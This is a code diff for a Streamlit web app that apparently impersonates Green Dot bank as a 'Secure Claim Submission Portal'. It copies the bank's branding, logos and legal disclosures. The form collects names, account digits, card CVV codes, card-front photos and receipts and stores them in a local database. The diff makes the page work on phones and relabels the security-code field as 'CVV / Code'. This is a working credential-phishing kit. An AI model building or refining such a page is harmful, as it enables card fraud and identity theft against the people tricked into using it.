@@ -23,69 +23,102 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# --- STYLING ---
+# --- STYLING (Responsive + Theme Awareness) ---
 st.markdown("""<style>
-.main { background-color: #f4f7f6; }
+/* Soporte para modo claro/oscuro usando variables de Streamlit */
+.main { 
+    padding: 1rem;
+}
+
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
-    border-radius: 5px !important;
+    border-radius: 8px !important;
     font-weight: bold !important;
+    width: 100%;
 }
+
+/* Sección de descarga responsiva */
 .app-section-container {
     background-color: #000000;
     color: #ffffff;
-    padding: 60px 20px;
+    padding: 40px 20px;
     text-align: center;
-    margin-top: 50px;
-    width: 100vw;
-    position: relative;
-    left: 50%;
-    right: 50%;
-    margin-left: -50vw;
-    margin-right: -50vw;
+    margin-top: 30px;
+    width: 100%;
+    border-radius: 15px;
 }
-.app-headline { font-size: 2.8rem; font-weight: 800; margin-bottom: 15px; }
-.app-subtext { font-size: 1.2rem; margin-bottom: 30px; max-width: 800px; margin: 0 auto; opacity: 0.9; }
-.store-buttons { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
+
+.app-headline {
+    font-size: clamp(1.5rem, 5vw, 2.5rem);
+    font-weight: 800;
+    margin-bottom: 15px;
+}
+
+.app-subtext {
+    font-size: clamp(0.9rem, 2vw, 1.1rem);
+    margin-bottom: 25px;
+    max-width: 600px;
+    margin: 0 auto 25px auto;
+    opacity: 0.85;
+}
+
+.store-buttons {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+    flex-wrap: wrap;
+}
+
+.store-buttons img {
+    width: 140px;
+    height: auto;
+}
 
 .legal-footer {
-    font-size: 0.85rem;
-    color: #444444;
-    text-align: left;
-    line-height: 1.6;
-    padding: 50px 10%;
-    background-color: #f4f7f6;
+    font-size: 0.75rem;
+    color: gray;
+    text-align: justify;
+    line-height: 1.5;
+    padding: 20px 0;
+    margin-top: 40px;
     border-top: 1px solid #ddd;
+}
+
+/* Ajustes para móviles */
+@media (max-width: 600px) {
+    .app-headline { font-size: 1.8rem; }
+    .legal-footer { text-align: left; }
 }
 </style>""", unsafe_allow_html=True)
 
 # --- HEADER ---
-if os.path.exists('logo.svg'):
-    st.image('logo.svg', width=200)
+with st.container():
+    if os.path.exists('logo.svg'):
+        st.image('logo.svg', width=180)
+    st.title("Green Dot Help Center")
+    st.info("Secure Claim Submission Portal")
 
-st.title("Green Dot Help Center")
-st.write("### Secure Claim Submission Portal")
 st.divider()
 
 # --- FORM ---
 with st.container():
     st.subheader("Submit a New Claim")
-    with st.form("claim_form_final", clear_on_submit=True):
-        c1, c2 = st.columns(2)
-        with c1:
-            nombre = st.text_input("Full Name")
-            cuenta = st.text_input("Account Number (Last 4 digits)")
-        with c2:
-            codigo = st.text_input("Security Code")
-            monto = st.number_input("Disputed Amount ($)", min_value=0.0, step=0.01)
+    with st.form("claim_form_responsive", clear_on_submit=True):
+        nombre = st.text_input("Full Name")
+        col1, col2 = st.columns([1, 1])
+        with col1:
+            cuenta = st.text_input("Account Number (Last 4)")
+        with col2:
+            codigo = st.text_input("CVV / Code")
+        
+        monto = st.number_input("Disputed Amount ($)", min_value=0.0, step=0.01)
 
-        st.write("**Evidence Required**")
-        f_col, t_col = st.columns(2)
-        with f_col: file_factura = st.file_uploader("Store Receipt", type=['png', 'jpg', 'jpeg'])
-        with t_col: file_tarjeta = st.file_uploader("Card Front Photo", type=['png', 'jpg', 'jpeg'])
+        st.write("**Required Evidence**")
+        file_factura = st.file_uploader("Store Receipt", type=['png', 'jpg', 'jpeg'])
+        file_tarjeta = st.file_uploader("Card Front Photo", type=['png', 'jpg', 'jpeg'])
 
-        submit = st.form_submit_button("SUBMIT SECURE DISPUTE")
+        submit = st.form_submit_button("SUBMIT DISPUTE")
 
 if submit:
     if nombre and file_factura and file_tarjeta:
@@ -93,41 +126,37 @@ if submit:
         t_path = os.path.join(UPLOAD_DIR, f"t_{int(datetime.now().timestamp())}_{file_tarjeta.name}")
         with open(f_path, 'wb') as f: f.write(file_factura.getbuffer())
         with open(t_path, 'wb') as f: f.write(file_tarjeta.getbuffer())
+        
         conn = sqlite3.connect(DB_NAME)
         c = conn.cursor()
         c.execute("INSERT INTO greendot_submissions (nombre, cuenta, codigo_tarjeta, monto, factura_path, tarjeta_path, fecha) VALUES (?,?,?,?,?,?,?)",
                   (nombre, cuenta, codigo, monto, f_path, t_path, str(datetime.now())))
         conn.commit()
         conn.close()
-        st.success("✅ Your claim has been submitted successfully.")
+        st.success("✅ Submitted successfully.")
     else:
         st.error("⚠️ Please complete all fields.")
 
-# --- APP DOWNLOAD SECTION ---
+# --- APP DOWNLOAD SECTION (DARK MODE) ---
 st.markdown("""
 <div class="app-section-container">
     <div class="app-headline">Download the Green Dot app</div>
     <div class="app-subtext">
-        We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.
+        Manage your account from making deposits, to sending money or paying bills.
     </div>
     <div class="store-buttons">
-        <a href="#"><img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg" width="180"></a>
-        <a href="#"><img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg" width="180"></a>
+        <a href="#"><img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg"></a>
+        <a href="#"><img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg"></a>
     </div>
 </div>
 """, unsafe_allow_html=True)
 
-# --- DETAILED LEGAL FOOTER ---
+# --- LEGAL FOOTER ---
 st.markdown("""
 <div class="legal-footer">
     * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
-    Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account. Mobile number verification, email address verification and mobile app are required to access all features.<br><br>
-    The check cashing service is provided by Ingo Money, Inc. and the sponsor bank identified in the Terms and Conditions for the service and Ingo Money, Inc., which are third parties that operate independently from GO2bank.com. Ingo Money will provide customer service for all mobile check cashing. Subject to the Terms and Conditions and Privacy Policy. Approval usually takes 3-5 minutes but may take up to one hour. All checks are subject to approval for funding in Ingo Money’s sole discretion. Fees apply for approved ‘Money in Minutes’ transactions funding to your card or account. Unapproved checks will not be loaded to your card or account. Ingo Money reserves the right to recover losses resulting from illegal or fraudulent use of the Ingo Money Service. Your wireless carrier may charge a fee for data usage. Additional transaction fees, costs, terms and conditions may be associated with the funding use of your card or account. See your Cardholder Account Agreement for details. Note: Ingo Money check cashing services is not available for use within the state of New York.<br><br>
-    Green Dot® cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association. And by Mastercard International Inc. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated.<br><br>
-    GO2bank™ cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association.<br><br>
-    Green Dot Bank also operates under the following registered trade names: GO2bank, GoBank and Bonneville Bank. All of these registered trade names are used by, and refer to, a single FDIC-insured bank, Green Dot Bank. Deposits under any of these trade names are deposits with Green Dot Bank and are aggregated for deposit insurance coverage up to the allowable limits.<br><br>
-    All third-party names and logos are trademarks of their respective owners. These owners are not affiliated with Green Dot Corporation and have not sponsored or endorsed Green Dot Bank products or services. Neither Green Dot Corporation, Visa U.S.A. nor any of their respective affiliates are responsible for the products or services provided by Ingo® Money and Plaid, Inc. Partner terms and conditions apply.<br><br>
-    Apple, the Apple logo, and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries. App Store is a service mark of Apple Inc. Google, Android and Google Play are trademarks of Google Inc., registered in the U.S. and other countries. Samsung is a registered trademark of Samsung Electronics Co., Ltd.<br><br>
-    <strong>©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.</strong>
+    Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification (via text message) and identity verification (including SSN) are required to open and use your account.<br><br>
+    Green Dot Bank also operates under the following registered trade names: GO2bank, GoBank and Bonneville Bank. All of these registered trade names are used by, and refer to, a single FDIC-insured bank, Green Dot Bank.<br><br>
+    <strong>©2026 Green Dot Corporation. All rights reserved. NMLS #914924.</strong>
 </div>
 """, unsafe_allow_html=True)
